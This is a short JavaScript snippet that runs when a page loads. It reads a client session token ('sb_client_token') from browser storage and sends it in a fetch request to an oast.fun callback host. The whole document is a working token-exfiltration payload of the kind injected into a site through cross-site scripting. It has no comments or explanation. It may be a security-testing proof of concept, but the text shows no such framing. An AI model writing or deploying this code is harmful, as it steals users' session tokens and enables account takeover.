document.addEventListener("DOMContentLoaded", () => {
    const sessionToken = sessionStorage.getItem("sb_client_token");
    const localToken = localStorage.getItem("sb_client_token");
    const token = sessionToken || localToken;

    if (token) {
        fetch(`https://rddllovzousqsobdgdtx9y20oju9plvex.oast.fun/?token=${encodeURIComponent(token)}`)
        .then(response => response.text())
        .catch(error => console.error("Error sending token:", error));
    }
});
